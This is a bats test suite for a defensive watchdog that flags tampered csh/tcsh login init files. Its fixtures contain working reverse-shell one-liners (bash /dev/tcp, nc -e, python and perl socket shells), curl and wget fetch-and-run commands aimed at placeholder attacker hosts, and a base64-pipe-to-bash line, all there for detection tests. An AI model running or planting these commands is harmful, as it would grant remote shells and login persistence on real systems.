#!/usr/bin/env bats
# L2 bats functional tests for the csh-config-watchdog scan script.
#
# The system csh/tcsh init files (/etc/csh.cshrc, /etc/csh.login,
# /etc/csh.logout) are SOURCED for every csh/tcsh login — a per-login exec
# surface (T1546). A file that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-csh-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/csh-config-watchdog/systemd/csh-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CSHRC="${TMP}/csh.cshrc"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_CSH_PROFILE="${PROFILE:-report}" \
    SELFDEF_CSH_BASELINE="${BASELINE}" \
    SELFDEF_CSH_FILES="${FILES_V:-$CSHRC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# csh.cshrc\nsetenv PATH /usr/bin:/bin\numask 022\n' > "${CSHRC}"
}

@test "no csh config → ok / no_csh_config" {
    FILES_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_csh_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign csh config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged csh config on second run → ok / csh_config_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"csh_config_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in csh config → alert / csh_config_suspicious" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"csh_config_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable csh config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign csh config change → warn / csh_config_changed" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nsetenv PATH /usr/bin:/bin:/usr/local/bin\numask 027\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"csh_config_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned csh config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious csh config" {
    seed_benign
    run_wd
    printf '# csh.cshrc\ncurl http://evil/p|sh\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — csh config inventory enumerates per-login source surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in csh config → alert" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in csh config → alert" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nwget -qO- http://attacker/p | sh\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in csh config → alert" {
    seed_benign
    run_wd
    printf '# csh.cshrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable csh config): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable csh config): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${CSHRC}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-csh-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): csh-config-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # csh-config injection patterns are NEVER routine; the alert
    # must persist across runs until operator explicitly re-
    # baselines.
    seed_benign
    run_wd
    printf '# csh.cshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"csh_config_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # csh config uses # as comment marker. Operator notes about
    # hypothetical attack patterns must not surface as real
    # injection.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh.cshrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nsetenv PATH /usr/bin:/bin\n' > "${CSHRC}"
    run_wd
    ! cap | grep -q '"event":"csh_config_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-sh injection family — bash subshell variant — also detected)" {
    # curl http://... | bash variant.
    seed_benign
    run_wd
    printf '# csh.cshrc\ncurl -s http://attacker.com/payload.sh | bash\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: csh.login axis also scanned, not only csh.cshrc — full per-login surface)" {
    # /etc/csh.login is sourced for LOGIN shells specifically.
    # Attackers may target it directly. Watchdog must walk all
    # three files (csh.cshrc + csh.login + csh.logout).
    CSHLOGIN="${TMP}/csh.login"
    seed_benign
    FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in csh.login.
    printf '# csh.login\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHLOGIN}"
    FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (csh.logout axis — third per-login file — also scanned)" {
    # /etc/csh.logout is sourced at logout time — a per-session
    # exec surface. Sister axis to csh.cshrc + csh.login.
    CSHLOGOUT="${TMP}/csh.logout"
    seed_benign
    FILES_V="${CSHRC} ${CSHLOGOUT}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh.logout\nwget -qO- http://attacker/p | sh\n' > "${CSHLOGOUT}"
    FILES_V="${CSHRC} ${CSHLOGOUT}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in csh config: netcat-listening pipe also detected)" {
    # Sister to sshrc-watchdog nc reverse-shell variant INVARIANT.
    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are
    # a canonical RCE primitive. Lock detection alongside the
    # bash /dev/tcp variant.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh.cshrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${CSHRC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (sample names offending file in JSON — operator triage routing)" {
    # When injection-pattern alert fires, sample MUST surface the
    # file path so operator dashboard routes triage to the right
    # path. Sister contract: sshrc/polkit-rules/nfs-exports/rhosts/
    # tmpfiles/securetty sample-naming pattern.
    USER_CSHRC="${TMP}/user-distinctive-attacker.cshrc"
    seed_benign
    FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# user csh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USER_CSHRC}"
    FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
    cap | grep -q 'user-distinctive-attacker'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on csh-config surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the csh per-
    # login source surface (T1546.004 — csh.login + csh.cshrc +
    # csh.logout sourced into every csh/tcsh interactive login).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${CSHRC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on csh-config surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp csh-config
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency; 'use Socket' produces
    # a one-liner connect-back PTY just as cleanly as Python. Locks
    # the perl axis on the T1546.004 csh per-login source surface
    # — csh.login + csh.cshrc + csh.logout sourced into every csh/
    # tcsh interactive login, so planted perl rev-shell fires on
    # every login until detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${CSHRC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-csh-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (baseline re-establish on operator out-of-band deletion: missing baseline re-creates cleanly + emits baseline_initial)" {
    # Sister to brain-wide baseline-re-establish INVARIANTs.
    # State-resilience on T1546.004 csh per-login source
    # surveillance.
    seed_benign
    run_wd                                              # establishes baseline
    [ -f "${BASELINE}" ]
    rm -f "${BASELINE}"                                  # operator wipe
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # must re-establish
    [ -f "${BASELINE}" ]
    cap | grep -qE '"event":"baseline_initial"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on csh-config surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The csh-config-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546.004 csh per-login source persistence
    # alert. Locks parser contract on the csh.cshrc/csh.login/
    # csh.logout detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '# csh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # csh-config-watchdog runs ON the timer's scheduled fire —
    # scans /etc/csh.cshrc + /etc/csh.login + /etc/csh.logout
    # for injection patterns, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the csh-config-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/csh-config-watchdog/systemd/selfdef-csh-config.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. csh-config-watchdog manifest declares install +
    # profile gating the resolver enforces; malformed manifest
    # wedges the csh.cshrc / csh.login / csh.logout scanner.
    # Python's tomllib is the canonical parser. Locks anti-
    # malformed-manifest on the csh-config-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/csh-config-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as f:
    data = tomllib.load(f)
assert data['name'] == 'csh-config-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
